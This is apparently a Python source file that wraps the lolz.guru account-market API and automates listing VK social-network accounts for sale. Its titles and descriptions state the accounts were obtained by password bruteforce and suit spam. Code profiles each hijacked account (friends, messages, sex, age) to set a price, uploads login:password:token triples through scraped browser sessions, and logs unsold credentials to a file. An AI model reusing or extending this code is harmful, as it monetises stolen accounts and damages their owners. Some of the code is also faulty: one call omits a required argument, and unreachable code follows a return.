import binascii
import os
import random
import string
import sys
import time
from datetime import datetime
from threading import Lock

import requests
from lxml import html
import cloudscraper


class LolzApi:
    def __init__(self, token: str, userid: int = None, base_url="https://api.lolz.guru/", browser_cookie=None):
        self.token = token
        self.userid = userid
        self.baseUrl = base_url
        self.session = requests.session()
        self.session.headers = {'Authorization': f'Bearer {self.token}'}
        self.browser_session = cloudscraper.Session()
        self.browser_session.headers['cookie'] = browser_cookie
        for (name, value) in (i.split('=', 1) for i in browser_cookie.split(';') if '=' in i):
            self.browser_session.cookies.set(name, value)
        self.browser_session.headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.53"



    def get(self, url, params={}):
        return self.session.get(self.baseUrl + url, params=params).json()

    def post(self, url, data={}):
        return self.session.post(self.baseUrl + url, data=data).json()

    def delete(self, url, data={}):
        return self.session.delete(url, data=data).json()

    def market_me(self):
        return self.get(f'market/me')

    def market_list(self, category: str = None, pmin: int = None, pmax: int = None, title: str = None,
                    parse_sticky_items: str = None, optional: dict = None):
        if category:
            data = {}
            if title: data['title'] = title
            if pmin: data['pmin'] = pmin
            if pmax: data['pmax'] = pmax
            if parse_sticky_items: data['parse_sticky_items'] = parse_sticky_items
            if optional: data = {**data, **optional}
            return self.get(f'market/{category}', data)
        else:
            return self.get('market')

    def market_orders(self, category: str = None, pmin: int = None, pmax: int = None, title: str = None,
                      showStickyItems: str = None, optional: dict = None):
        if not self.userid:
            raise NotSetUserid
        if category:
            data = {}
            if title: data['title'] = title
            if pmin: data['pmin'] = pmin
            if pmax: data['pmax'] = pmax
            if showStickyItems: data['showStickyItems'] = showStickyItems
            if optional: data = {**data, **optional}
            return self.get(f'market/user/{self.userid}/orders/{category}', data)
        else:
            return self.get(f'market/user/{self.userid}/orders')

    def market_fave(self):
        return self.get(f'market/fave')

    def market_viewed(self):
        return self.get(f'market/viewed')

    def market_item(self, item):
        return self.get(f'market/{item}')

    def market_reserve(self, item: int):
        return self.session.post(self.baseUrl + f'market/{item}/reserve',
                                 data={'price': self.market_item(item)['item']['price']})

    def market_cancel_reserve(self, item: int):
        return self.session.post(self.baseUrl + f'market/{item}/cancel-reserve')

    def market_check_account(self, item: int):
        return self.session.post(self.baseUrl + f'market/{item}/check-account')

    def market_confirm_buy(self, item: int):
        return self.session.post(self.baseUrl + f'market/{item}/confirm-buy')

    def market_buy(self, item: int):
        res = self.market_reserve(item)
        if res['status']:
            res1 = self.market_check_account(item)
            if res1['status']:
                return self.market_confirm_buy()
            else:
                return res1
        else:
            return res

    def market_transfer(self, receiver: int, receiver_username: str, amount: int, secret_answer: str,
                        currency: str = 'rub', comment: str = None, transfer_hold: str = None,
                        hold_length_value: str = None, hold_length_option: int = None):
        data = {
            'user_id': receiver,
            'username': receiver_username,
            'amount': amount,
            'secret_answer': secret_answer,
            'currency': currency
        }
        if comment: data['comment'] = comment
        if transfer_hold: data['transfer_hold'] = transfer_hold
        if hold_length_value: data['hold_length_value'] = hold_length_value
        if hold_length_option: data['hold_length_option'] = hold_length_option

        return self.session.post(self.baseUrl + f'market/balance/transfer', data)
    def stick_item(self, item_id: int):
        return self.post(f'market/{item_id}/stick')
    def my_items(self):
        return self.get(f'market/user/{self.userid}/items/')
    def market_payments(self, type_: str = None, pmin: int = None, pmax: int = None, receiver: str = None,
                        sender: str = None, startDate: datetime = None, endDate: datetime = None, wallet: str = None,
                        comment: str = None, is_hold: str = None):
        if not self.userid:
            raise NotSetUserid
        data = {}
        if type_: data['type'] = type_
        if pmin: data['pmin'] = pmin
        if pmax: data['pmax'] = pmax
        if receiver: data['receiver'] = receiver
        if sender: data['sender'] = sender
        if startDate: data['startDate'] = startDate
        if endDate: data['endDate'] = endDate
        if wallet: data['wallet'] = wallet
        if comment: data['comment'] = comment
        if is_hold: data['is_hold'] = is_hold
        return self.get(self.baseUrl+f'market/user/{self.userid}/payments', data)

    def market_add_item(self, title: str, price: int, category_id: int, item_origin: str, extended_guarantee: int,
                        currency: str = 'rub', title_en: str = None, description: str = None, information: str = None,
                        has_email_login_data: bool = None, email_login_data: str = None, email_type: str = None,
                        allow_ask_discount: bool = None, proxy_id: int = None):
        """_summary_
        Args:
            title (str): title
            price (int): price account in currency
            category_id (int): category id (readme)
            item_origin (str): brute, fishing, stealer, autoreg, personal, resale
            extended_guarantee (int): -1 (12 hours), 0 (24 hours), 1 (3 days)
            currency (str, optional): cny, usd, rub, eur, uah, kzt, byn, gbp. Defaults to 'rub'.
            title_en (str, optional): title english. Defaults to None.
            description (str, optional): public information about account. Defaults to None.
            information (str, optional): private information about account for buyer. Defaults to None.
            has_email_login_data (bool, optional): true or false. Defaults to None.
            email_login_data (str, optional): login:password. Defaults to None.
            email_type (str, optional): native or autoreg. Defaults to None.
            allow_ask_discount (bool, optional): allow ask discount for users. Defaults to None.
            proxy_id (int, optional): proxy id. Defaults to None.
        """
        data = {
            'title': title,
            'price': price,
            'category_id': category_id,
            'currency': currency,
            'item_origin': item_origin,
            'extended_guarantee': extended_guarantee
        }
        if title_en: data['title_en'] = title_en
        if description: data['description'] = description
        if information: data['information'] = information
        if has_email_login_data: data['has_email_login_data'] = has_email_login_data
        if email_login_data: data['email_login_data'] = email_login_data
        if email_type: data['email_type'] = email_type
        if allow_ask_discount: data['allow_ask_discount'] = allow_ask_discount
        if proxy_id: data['proxy_id'] = proxy_id

        return self.session.post(self.baseUrl + f'market/item/add', data)
    def _get_xf_token(self, url: str, need_html: bool = False):
        ans = self.browser_session.get(url).text
        h = html.fromstring(ans)
        element = h.cssselect("input[name='_xfToken']")
        if need_html: return h, element[0].value
        return element[0].value

    def market_add_item_no_api(self, title: str, price: int, category_id: int, title_en: str,
                               description: str, vk_login: str, vk_password: str, vk_token: str):
        token = self._get_xf_token("https://lolz.guru/market/mass-upload/2/start")
        time.sleep(12)
        ans = self.browser_session.post("https://lolz.guru/market/mass-upload/2/start", data=(
            ("title_ru", title),
            ("title_en", title_en),
            ('auto_translate', 1),
            ('currency', 'rub'),
            ('price', price),
            ('allow_ask_discount', 'on'),
            ('item_origin', 'brute'),
            ('raw_data', f'{vk_login}:{vk_password}:{vk_token}'),
            ('description_html', '<p>'+description+'<br></p>'),
            ('_xfRelativeResolver', 'https://lolz.guru/market/mass-upload/2/start'),
            ('information_html', '<p><br></p>'),
            ('_xfRelativeResolver', 'https://lolz.guru/market/mass-upload/2/start'),
            ('auto_start', 'on'),
            ('_xfToken', token),
            ('t', ''),
            ('_xfConfirm', 1),
            ('submit', 'Поставить аккаунты в очередь'),
            ('_xfRequestUri', '/market/mass-upload/2/start'),
            ('_xfNoRedirect', 1),
            ('_xfToken', token),
            ('_xfResponseType', 'json'),
        ), headers={
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://lolz.guru/market/mass-upload/2/start",
            "x-ajax-referer": "https://lolz.guru/market/mass-upload/2/start",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua": '"Chromium";v="102", "Opera";v="88", ";Not A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-site": "same-origin",
            "sec-ch-ua-platform": '"Windows"',
        })
        ans = ans.json()
        url = ans['_redirectTarget']
        html, token = self._get_xf_token(url, True)
        account = html.cssselect("div.account")[0]
        entry_id = account.attrib['data-entry-id']
        time.sleep(6)
        queue_id = next(i for i in url.split("/") if i.isdigit())
        answer = self.browser_session.post("https://lolz.guru/market/mass-upload/check-account", headers={
            "origin": "https://lolz.guru",
            "referer": url,
            "sec-ch-ua": '"Chromium";v="102", "Opera";v="88", ";Not A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-ajax-referer': url,
            'x-requested-with': 'XMLHttpRequest'
        }, data={
            'queue_id': queue_id,
            'entry_id': entry_id,
            '_xfRequestUri': f'/market/mass-upload/{queue_id}/',
            '_xfNoRedirect': 1,
            '_xfToken': token,
            '_xfResponseType': 'json'
        })
        try: answer = answer.json()
        except Exception as e: answer = e
        return url, answer
        # token = self._get_xf_token("https://lolz.guru/market/item/add?category_id=2")
        #
        # answer = self.browser_session.post("https://lolz.guru/market/item/add", headers={
        #     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        #     "referer": "https://lolz.guru/market/item/add?category_id=2",
        #     "x-ajax-referer": "https://lolz.guru/market/item/add?category_id=2",
        #     "x-requested-with": "XMLHttpRequest"
        # },
        #                                    data={
        #     "category_id": category_id,
        #     "title_ru": title,
        #     "title_en": title_en,
        #     "auto_translate": 1,
        #     "currency": "rub",
        #     "price": price,
        #     "allow_ask_discount": "on",
        #     "item_origin": "brute",
        #     "description_html": "<p>"+description+"</p>",
        #     "_xfRelativeResolver": "https://lolz.guru/market/item/add?category_id=2",
        #     "information_html": "<p><br></p>",
        #     "_xfRelativeResolver": "https://lolz.guru/market/item/add?category_id=2",
        #     "proxy_id": 147022,
        #     "_xfToken": token,
        #     "t": 0,
        #     "_xfConfirm": 1,
        #     "submit": "Перейти к добавлению товара",
        #     "_xfRequestUri": "/market/item/add?category_id=2",
        #     "_xfNoRedirect": 1,
        #     "_xfToken": token,
        #     "_xfResponseType": "json"
        # })
        # answer = answer.json()
        # url = answer['_redirectTarget']
        # t = next(i.split('=')[1] for i in url.split("?")[1].split("&") if 't=' in i)
        # item_id = next(i for i in url.split('/') if i.isdigit())
        # xtoken = self._get_xf_token(url)
        # bounary = "WebKitFormBoundary" + "".join( random.choice(string.ascii_letters) for _ in range(len('ZuOLax1e0srdLmw9')))
        # data = {
        #     'login_password': f"{vk_login}:{vk_password}",
        #     'extra[vk_token]': vk_token,
        #     '_xfToken': xtoken,
        #     'random_proxy': '',
        #     '_xfRequestUri': f"/market/{item_id}/goods/add?t={t}",
        #     '_xfNoRedirect': '1',
        #     '_xfToken': xtoken,
        #     '_xfResponseType': 'json',
        # }
        #
        # m = {i: (None, data[i], ) for i in data}
        # time.sleep(15)
        #
        # enc = MultipartEncoder(fields=m, boundary=bounary)
        # uploaded_account = requests.post(url, headers={
        #     "Referer": url,
        #     "X-Ajax-Referer": url,
        #     'X-Requested-With': "XMLHttpRequest",
        #     'Accept': 'application/json, text/javascript, */*; q=0.01',
        #     'ec-ch-ua': '"Chromium";v="102", "Opera";v="88", ";Not A Brand";v="99"',
        #     'sec-ch-ua-mobile': '?0',
        #     'sec-ch-ua-platform': '"Windows"',
        #     'Content-Type': enc.content_type
        # }, data=enc)
        # uploaded_account = uploaded_account.json()
        # return uploaded_account
    def market_add_item_check(self, item: int, login: str = None, password: str = None, loginpassword: str = None,
                              close_item: bool = None, extra_token_vk: str = None):
        data = {}
        if login: data['login'] = login
        if password: data['password'] = password
        if loginpassword: data['loginpassword'] = loginpassword
        if close_item: data['close_item'] = close_item
        if extra_token_vk:
            data['extra[vk_token]'] = extra_token_vk

        return self.post(f'market/{item}/goods/check', data)

    def market_get_email(self, item: int, email: str):
        return self.get(f'market/{item}/email-code', {'email': email})

    def market_refuse_guarantee(self, item: int):
        return self.post(f'market/{item}/refuse-guarantee')

    def market_change_password(self, item: int):
        return self.post(f'market/{item}/change-password')

    def market_delete(self, item: int, reason: str):
        return self.delete(f'market/{item}/delete', {'reason': reason})

    def market_bump(self, item: int):
        return self.post(f'market/{item}/bump')


api = None
ApiLock = Lock()
class NotSetUserid(Exception): pass
class LolzError(Exception): pass
def get_account_price(api):
    code = """
var user = API.users.get({fields:"counters,has_photo,sex,bdate"})[0];
var groups = API.groups.get({"filter":"admin", "extended":1, fields:"members_count"});
var messagesCount = API.messages.getConversations({count:0}).count;
var c = 0, subs = 0;
while(c < groups.length){
    subs = subs + groups.items[c].members_count;
    c = c + 1;
}
return {
    friends: user.counters.friends,
    subs: user.counters.subscriptions,
    groups_c: subs,
    has_photo: user.has_photo,
    messages: messagesCount,
    sex: user.sex, 
    bdate: user.bdate
};
    """

    user = api.method("execute", code=code)
    if 'response' not in user: raise PermissionError(f"Invalid session: {user}")
    user = user['response']
    count = (user['friends'] or 0) + (user['subs'] or 0) * 0.5 + \
            (user['has_photo'] or 0) * 30 + (user['messages'] or 0) * 0.3 + int(user['groups_c']) * 0.1
    splited_bd = (user.get('bdate') or '').split('.')
    if len(splited_bd) == 3:
        day, month, year = splited_bd
        old = (datetime.now() - datetime(int(year), int(month), int(day))).days / 365.2
    else: old = 0
    return 13 + round(count / 30), int(user['groups_c']), ('w' if user['sex'] == 1 else 'm'), old
def upload_account_to_lolz(token, user_id, cookies, vk_api, vk_login, vk_password, vk_token):
    account_price, big_groups, sex, years_old = get_account_price(vk_api)
    title = f"[{datetime.now().hour}:{datetime.now().minute}][Перебор паролей] Брут"
    title_en = f"[{datetime.now().hour}:{datetime.now().minute}][Password crack] Bruteforce"
    if sex == 'w': title += " | Женский"; title_en += " | Woman"
    else: title += " | Мужской"; title_en += " | Man"
    if years_old > 18 and years_old < 33: title += " | 18+"; title_en += " | 18+"
    if big_groups > 500:
        title += f" | ({round(big_groups/1000, 1)}k подписчиков в группе)"
        title_en += f" | ({round(big_groups/1000, 1)}k subs)"
    if account_price < 16:
        title += " | Дешево"
        title_en += " | Almost free"
    global api

    def encode_multipart_formdata(fields):
        boundary = binascii.hexlify(os.urandom(16)).decode('ascii')

        body = (
                "".join("--%s\r\n"
                        "Content-Disposition: form-data; name=\"%s\"\r\n"
                        "\r\n"
                        "%s\r\n" % (boundary, field, value)
                        for field, value in fields.items()) +
                "--%s--\r\n" % boundary
        )

        content_type = "multipart/form-data; boundary=%s" % boundary

        return body, content_type
    with ApiLock:
        if api is None: api = LolzApi(token, user_id, browser_cookie=cookies)
        if account_price:
            url, ans = api.market_add_item_no_api(
                title,
                price=account_price,
                category_id=2,
                title_en=title_en,
                description=f"Качественные аккаунты, полученные методом брутфорса {datetime.now()}.\n"
                            f"Отлично подойдут как для спама, так и для других целей.",
                vk_login=vk_login,
                vk_password=vk_password,
                vk_token=vk_token
            )
            return f"Успешно загрузил на маркет: {url}, {ans}"
            answer = api.market_add_item(
                    title,
                    price=account_price,
                    category_id=2,
                item_origin="brute",
                extended_guarantee=-1,
                title_en=title_en,
                description=f"Качественные аккаунты, полученные методом брутфорса {datetime.now()}.\n"
                            f"Отлично подойдут как для спама, так и для других целей.",
                allow_ask_discount=True,
            )
            item_id = answer.json()['item']['item_id']
            time.sleep(5)
            for i in range(5):
                uploaded_account = api.market_add_item_check(
                    item=item_id,
                    close_item=False,
                    # login=vk_login,
                    # password=vk_password,
                    loginpassword=f"{vk_login}:{vk_password}",
                    extra_token_vk=vk_token
                )
                if 'errors' in uploaded_account:
                    errors = uploaded_account['errors']
                for i in errors:
                    if 'уже продается' in i.lower(): break
                if uploaded_account.get('status') == 'ok':
                    break
                time.sleep(5)
            else: return f"Не удалось загрузить аккаунт ({vk_login}:{vk_password}:{vk_token}) " \
                         f"на продажу: {uploaded_account}"

            return f"Успешно загрузил аккаунт на продажу за {account_price} RUB"
        else:
            with open("out/top_accounts.txt", "a", encoding="utf-8") as f:
                f.write(f"{account_price}:{vk_login}:{vk_password}:{vk_token}\n")
            return f"Account price: {account_price}"
def pin_accounts(token, user_id, cookies):
    with ApiLock:
        global api
        if api is None: api = LolzApi(token, user_id, browser_cookie=cookies)
        items = api.my_items()
        if 'items' not in items:
            raise ValueError(f"Items is invalid: {items}")
        for i in reversed(items['items']):
            if i['canStickItem']:
                ans = api.stick_item(i['item_id'])
                if 'errors' in ans: raise LolzError(ans)
                return f"Закрепил аккаунт {i['title']}"


